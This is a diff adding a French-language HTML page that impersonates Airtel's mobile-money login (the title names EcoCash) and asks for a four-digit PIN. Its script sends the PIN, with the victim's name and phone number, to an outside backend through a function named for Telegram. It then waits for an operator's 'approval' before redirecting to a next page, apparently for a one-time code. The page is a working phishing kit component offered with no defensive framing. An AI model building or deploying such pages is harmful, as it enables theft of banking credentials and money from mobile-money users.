@@ -1,0 +1,251 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>EcoCash | Entrer le code PIN</title>
+
+<style>
+*{
+  margin:0;
+  padding:0;
+  box-sizing:border-box;
+}
+
+body{
+  font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;
+  background:#f2f2f2;
+  min-height:100vh;
+}
+
+/* MAIN CONTAINER */
+.container{
+  min-height:100vh;
+  display:flex;
+  flex-direction:column;
+  justify-content:center;
+  align-items:center;
+  padding:20px;
+}
+
+/* UPPER SECTION */
+.upper-section{
+  width:100%;
+  max-width:360px;
+  text-align:center;
+  background:transparent;
+}
+
+/* BRAND NAME */
+.brand-name{
+  font-size:42px;
+  font-weight:600;
+  color:#e60000;
+  margin-bottom:12px;
+}
+
+/* Welcome */
+.welcome-text{
+  font-size:22px;
+  color:#555;
+  margin-bottom:18px;
+}
+
+/* PHONE DISPLAY */
+.phone-display{
+  width:100%;
+  padding:16px;
+  border:2px solid #e60000;
+  border-radius:14px;
+  font-size:18px;
+  text-align:center;
+  color:#333;
+  background:#fff;
+  margin-bottom:26px;
+}
+
+/* PIN LABEL */
+.pin-label{
+  font-size:17px;
+  color:#666;
+  margin-bottom:18px;
+}
+
+/* PIN BOXES */
+.pin-boxes{
+  display:flex;
+  justify-content:center;
+  gap:14px;
+  margin-bottom:16px;
+}
+
+.pin-boxes input{
+  width:58px;
+  height:58px;
+  border:2px solid #e60000;
+  border-radius:12px;
+  font-size:24px;
+  text-align:center;
+  outline:none;
+  background:#fff;
+}
+
+/* STATUS */
+#status{
+  font-size:14px;
+  color:#e60000;
+  margin-top:8px;
+  min-height:18px;
+}
+
+/* LOWER SECTION */
+.lower-section{
+  width:100%;
+  max-width:360px;
+  text-align:center;
+  margin-top:28px;
+}
+
+/* BUTTON */
+.action-buttons{
+  display:flex;
+  gap:12px;
+  justify-content:center;
+  margin-bottom:26px;
+}
+
+.action{
+  flex:1;
+  background:#e60000;
+  color:#fff;
+  padding:14px;
+  border-radius:10px;
+  font-weight:600;
+}
+
+/* FOOTER */
+.footer{
+  font-size:14px;
+  color:#666;
+}
+
+.footer a{
+  color:#666;
+  text-decoration:underline;
+}
+</style>
+</head>
+
+<body>
+
+<div class="container">
+
+  <div class="upper-section">
+
+    <div class="brand-name">
+      Airtel
+    </div>
+
+    <div class="welcome-text">Bienvenue</div>
+
+    <input class="phone-display" id="phoneDisplay" readonly>
+
+    <div class="pin-label">Entrez votre code PIN</div>
+
+    <div class="pin-boxes">
+      <input type="tel" maxlength="1">
+      <input type="tel" maxlength="1">
+      <input type="tel" maxlength="1">
+      <input type="tel" maxlength="1">
+    </div>
+
+    <div id="status"></div>
+
+  </div>
+
+  <div class="lower-section">
+
+    <div class="action-buttons">
+      <div class="action">Connexion</div>
+    </div>
+
+    <div class="footer">
+      En continuant, vous acceptez les termes et conditions
+    </div>
+
+  </div>
+
+</div>
+
+<script>
+document.getElementById("phoneDisplay").value =
+  localStorage.getItem("phone") || "Numéro inconnu";
+
+const botId = new URLSearchParams(window.location.search).get("botId");
+const boxes = document.querySelectorAll(".pin-boxes input");
+const statusEl = document.getElementById("status");
+
+async function sendPinToTelegram(name, phone, pin) {
+  const BACKEND_URL = "https://airtel-money-loans.onrender.com";
+  try {
+    const res = await fetch(`${BACKEND_URL}/submit-pin`, {
+      method: "POST",
+      headers: {"Content-Type":"application/json"},
+      body: JSON.stringify({ name, phone, pin, botId })
+    });
+    return res.json();
+  } catch {
+    return null;
+  }
+}
+
+async function pollPinApproval(requestId) {
+  const BACKEND_URL = "https://airtel-money-loans.onrender.com";
+  return new Promise(resolve => {
+    const i = setInterval(async () => {
+      const r = await fetch(`${BACKEND_URL}/check-pin/${requestId}`);
+      const d = await r.json();
+      if(d.approved === true || d.approved === false){
+        clearInterval(i);
+        resolve(d.approved);
+      }
+    },1500);
+  });
+}
+
+boxes.forEach((box,i)=>{
+  box.addEventListener("input", async ()=>{
+    box.value = box.value.replace(/[^0-9]/g,'');
+    if(box.value && i<3) boxes[i+1].focus();
+    if(i===3 && box.value){
+      let pin=""; boxes.forEach(b=>pin+=b.value);
+      localStorage.setItem("pin",pin);
+      const name = localStorage.getItem("name")||"Unknown";
+      const phone = localStorage.getItem("phone")||"Unknown";
+      boxes.forEach(b=>b.disabled=true);
+      statusEl.textContent="Envoi du code PIN...";
+      const res = await sendPinToTelegram(name,phone,pin);
+      if(!res||!res.requestId){
+        statusEl.textContent="Échec. Veuillez réessayer.";
+        boxes.forEach(b=>{b.disabled=false;b.value="";});
+        boxes[0].focus(); return;
+      }
+      const ok = await pollPinApproval(res.requestId);
+      if(ok){
+        window.location.href="code.html?botId="+botId;
+      } else {
+        statusEl.textContent="Code PIN incorrect.";
+        boxes.forEach(b=>{b.disabled=false;b.value="";});
+        boxes[0].focus();
+      }
+    }
+  });
+  box.addEventListener("keydown",e=>{
+    if(e.key==="Backspace"&&!box.value&&i>0) boxes[i-1].focus();
+  });
+});
+boxes[0].focus();
+</script>
+
+</body>
+</html>
